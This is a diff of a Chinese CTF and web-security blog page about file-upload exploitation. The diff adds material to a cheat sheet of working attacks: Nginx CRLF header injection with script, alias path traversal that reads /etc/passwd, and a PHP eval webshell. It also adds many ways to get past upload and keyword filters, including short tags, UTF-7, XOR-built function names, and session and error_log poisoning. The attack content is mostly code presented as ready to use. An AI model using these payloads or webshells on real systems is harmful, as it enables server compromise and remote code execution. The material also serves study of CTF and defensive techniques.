 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 利用场景：Nginx作为反向代理，配置不当</span><br><span class="hljs-attribute">add_header</span> X-User-Input <span class="hljs-variable">$arg_name</span>;<br></code></pre></td></tr></table></figure>
@@ -556,6 +804,13 @@
 <p><strong>攻击Payload：</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注入新行，控制后续响应头</span><br>curl <span class="hljs-string">&quot;http://target.com/?name=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><br></code></pre></td></tr></table></figure>
 
+<hr>
+<h4 id="6-alias-路径穿越"><a href="#6-alias-路径穿越" class="headerlink" title="6. alias 路径穿越"></a>6. <strong>alias 路径穿越</strong></h4><p><code>location</code> 配 <code>alias</code> 少写结尾斜杠时，<code>../</code> 不会被吃掉，直接穿越到上级目录（读配置、读源码都行）：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /static &#123;<br>    <span class="hljs-attribute">alias</span> /var/www/static;      <span class="hljs-comment"># 少一个 / 就是洞</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://t/static../etc/passwd<br>curl http://t/static..%2f..%2fetc%2fpasswd<br></code></pre></td></tr></table></figure>
+
+<hr>
 <h2 id="实战总结"><a href="#实战总结" class="headerlink" title="实战总结"></a>实战总结</h2><p><strong>后缀被过滤：选.pphphp</strong></p>
 <p><strong><?php fputs(fopen("shell2.php","w"),'<?php @eval($_POST["cmd"]); ?>‘); phpinfo(); ?&gt;</strong></p>
 <p><strong>当一个服务器的黑盒弄不清的话，就试试RCE在网站上创一个php(即上传文件创建文件(必须要用burp的intrude仿反复放包有效才行)</strong></p>
@@ -589,6 +844,133 @@
 
 <p><strong>随后再访问当前上传目录一个不存在的文件触发404报错即可得出&#x2F;flag的内容</strong></p>
 <p><strong>当上传的文件无法被访问时，可以尝试将文件名改成一句话木马的形式（前提是要有能访问该木马目录的.php文件）</strong></p>
+<p><strong>当 <code>&lt;</code> 被过滤时，PHP 代码不一定非要有尖括号，六条路挨个试：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">手法</th>
+<th align="left">payload</th>
+<th align="left">前提</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">短标签</td>
+<td align="left"><code>&lt;?=system($_GET[0]);?&gt;</code></td>
+<td align="left">PHP ≥ 5.4 恒可用</td>
+</tr>
+<tr>
+<td align="left">开短标签</td>
+<td align="left"><code>php_flag short_open_tag on</code> + <code>&lt;? ... ?&gt;</code></td>
+<td align="left">mod_php</td>
+</tr>
+<tr>
+<td align="left">远古标签</td>
+<td align="left"><code>&lt;script language=&quot;php&quot;&gt; system($_GET[0]); &lt;/script&gt;</code></td>
+<td align="left">PHP ≤ 7.0</td>
+</tr>
+<tr>
+<td align="left">UTF-7 编码</td>
+<td align="left">见下</td>
+<td align="left">需 mbstring</td>
+</tr>
+<tr>
+<td align="left">base64 代打</td>
+<td align="left"><code>php://filter/convert.base64-decode</code> 包含 b64 文件</td>
+<td align="left">能配 <code>auto_prepend_file</code></td>
+</tr>
+<tr>
+<td align="left">服务端代写</td>
+<td align="left">session &#x2F; error_log &#x2F; include_path &#x2F; 日志包含</td>
+<td align="left">见下</td>
+</tr>
+</tbody></table>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># UTF-7：文件里根本没有 &lt;</span><br><span class="hljs-attribute">php_flag</span> zend.multibyte <span class="hljs-number">1</span><br><span class="hljs-attribute">php_value</span> zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">+ADw?php <span class="hljs-title function_ invoke__">system</span>(+ACQ-+AF8-GET+AFs-<span class="hljs-number">0</span>+AF0)+ADs ?+AD4-<br></code></pre></td></tr></table></figure>
+
+<p><strong>当关键字被过滤（<code>system</code>、<code>php_value</code>、<code>auto_prepend_file</code> 之类），三种打法：拆、编、拼</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">打法</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">拆（配置文件续行）</td>
+<td align="left"><code>php_\</code> 回车 <code>value auto_prepend_\</code> 回车 <code>file &quot;x&quot;</code></td>
+</tr>
+<tr>
+<td align="left">拼（字符串拼接）</td>
+<td align="left"><code>$f=&#39;sys&#39;.&#39;tem&#39;; $f($_GET[0]);</code></td>
+</tr>
+<tr>
+<td align="left">编（编码）</td>
+<td align="left"><code>&quot;\x73\x79\x73\x74\x65\x6d&quot;</code>、<code>base64_decode(&#39;c3lzdGVt&#39;)</code>、<code>strrev(&#39;metsys&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">双写</td>
+<td align="left"><code>pphphp</code>（只替换一次的黑名单）</td>
+</tr>
+<tr>
+<td align="left">变量函数</td>
+<td align="left"><code>$a=&#39;system&#39;; $a(&#39;id&#39;);</code></td>
+</tr>
+</tbody></table>
+<p><strong>当引号、括号、<code>$</code> 也被过滤时：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]`;<span class="hljs-meta">?&gt;</span>                  <span class="hljs-comment">// 反引号免括号，数字键免引号</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-meta">?&gt;</span>               <span class="hljs-comment">// include 可省括号</span><br><span class="hljs-meta">&lt;?=</span>`cat$&#123;IFS&#125;/flag`;<span class="hljs-meta">?&gt;</span>            <span class="hljs-comment">// 空格用 $&#123;IFS&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>当字母数字全被禁（<code>[a-zA-Z0-9]</code>），用异或 &#x2F; 取反 &#x2F; 自增硬凑函数名：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$f</span>=(<span class="hljs-string">&#x27;:J!RLA&#x27;</span>^<span class="hljs-string">&#x27;I3R&amp;),&#x27;</span>);<span class="hljs-variable">$f</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span>        <span class="hljs-comment">// 异或，两个等长串异或出 system</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$f</span>=(~<span class="hljs-string">&quot;\x8c\x86\x8c\x8b\x9a\x92&quot;</span>);<span class="hljs-variable">$f</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">// 取反，0xFF-c</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：这两条我按字节算过、等长异或无歧义，可以直接用；换函数名就自己重算一遍，别抄网上的常量（版本差异会翻车）。</p>
+</blockquote>
+<p><strong>当服务端自己会把 <code>&lt;</code> 写进文件时，让它替我们写（四种写入点）：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">写入点</th>
+<th align="left">怎么触发</th>
+<th align="left">落在哪</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">session.upload_progress</td>
+<td align="left">POST 带 <code>PHP_SESSION_UPLOAD_PROGRESS=&lt;?php ...?&gt;</code>，值不受上传内容过滤</td>
+<td align="left"><code>session.save_path/sess_&lt;id&gt;</code></td>
+</tr>
+<tr>
+<td align="left">error_log</td>
+<td align="left"><code>php_value error_log /var/www/html/x.php</code> + 触发带 payload 的报错</td>
+<td align="left">指定文件</td>
+</tr>
+<tr>
+<td align="left">include_path</td>
+<td align="left">把 <code>&lt;?php ...?&gt;</code> 塞进 include_path，再让它报「找不到文件」</td>
+<td align="left">由 error_log 决定</td>
+</tr>
+<tr>
+<td align="left">Apache&#x2F;Nginx 日志</td>
+<td align="left">UA &#x2F; URL 里塞 payload</td>
+<td align="left">需日志可读</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># session 投毒</span><br>curl -b <span class="hljs-string">&quot;PHPSESSID=abc123&quot;</span> \<br>     -F <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS=&lt;?php system(<span class="hljs-variable">$_GET</span>[0]);?&gt;&quot;</span> \<br>     -F <span class="hljs-string">&quot;file=@1.txt&quot;</span> http://t/upload/x.php<br>curl <span class="hljs-string">&quot;http://t/upload/sess_abc123?0=id&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># error_log 投毒：报错里带着 include_path，写进可访问的 php</span><br><span class="hljs-attribute">php_value</span> error_log /var/www/html/uploads/log.php<br><span class="hljs-attribute">php_value</span> include_path <span class="hljs-string">&quot;&lt;?php system($_GET[0]);?&gt;&quot;</span><br><span class="hljs-attribute">php_flag</span>  html_errors <span class="hljs-literal">off</span>      # 关键！默认会把 payload 转成 HTML 实体，落盘就废了<br></code></pre></td></tr></table></figure>
+
+<p><strong>当正则把内容卡死时，先把正则打瘸：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><br><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：只在过滤写成 <code>preg_match(...) == 1</code> 而不是 <code>!== 0</code> 时有效，正则超限返回 <code>false</code>，判断自然不成立。</p>
+</blockquote>
+<p><strong>拿到执行权后的一把梭（读 flag 常备）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://t/uploads/shell.php?0=id;ls -la /;cat /flag*&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*flag*&quot;</span>);<span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">// 不知道路径时先找</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
 <h2 id="真题演练"><a href="#真题演练" class="headerlink" title="真题演练"></a>真题演练</h2><h3 id="好靶场-难度7-尼奥的征途：寻找黑客帝国的密码"><a href="#好靶场-难度7-尼奥的征途：寻找黑客帝国的密码" class="headerlink" title="好靶场-难度7- 尼奥的征途：寻找黑客帝国的密码"></a>好靶场-难度7- 尼奥的征途：寻找黑客帝国的密码</h3><p>首先前面有关misc的题目就不多说了</p>
 <p>直接切到文件上传部分，发现前端有对png上传的过滤</p>
 <p><img src="/img/upload/1.png" srcset="/img/loading.gif" lazyload></p>
@@ -1025,18 +1407,18 @@
     </div>
   </div>
 
-  <div class="anime-footer-wrap">
+  <div class="anime-footer-wrap" id="site-footer">
     <div class="anime-footer">
       <div class="footer-line">
         <span id="runtime"></span>
       </div>
-      <div class="footer-line footer-statistics" data-site-hosts="zomnap.top">
-        <span id="busuanzi_container_site_uv">
-          总访客 <strong id="busuanzi_value_site_uv">711</strong> 人
+      <div class="footer-line footer-statistics">
+        <span class="footer-stat">
+          总访客 <strong data-site-uv>—</strong> 人
         </span>
-        <span id="busuanzi_container_site_pv">
+        <span class="footer-stat">
           <span class="divider" aria-hidden="true">·</span>
-          总访问 <strong id="busuanzi_value_site_pv">1503</strong> 次
+          总访问 <strong data-site-pv>—</strong> 次
         </span>
       </div>
       <div class="footer-line typing" id="footer-typing"></div>
@@ -1047,7 +1429,9 @@
   </div>
 
   <script src="/js/navbar-hide.js"></script>
-  <script src="/js/footer.js?v=mw7pnwbl"></script>
+  <script>window.BLOG_COUNTER = {"api":"https://abacus.jasoncameron.dev","namespace":"zomnap-blog","site_pv_offset":2259,"site_uv_offset":1146,"page_pv_offset":0,"page_offsets":{}};</script>
+  <script src="/js/visitor-counter.js?v=mwj238nt"></script>
+  <script src="/js/footer.js?v=mwj238nt"></script>
   <script src="/js/corner-cat.js"></script>
   <!-- hexo injector body_end end --></body>
 </html>
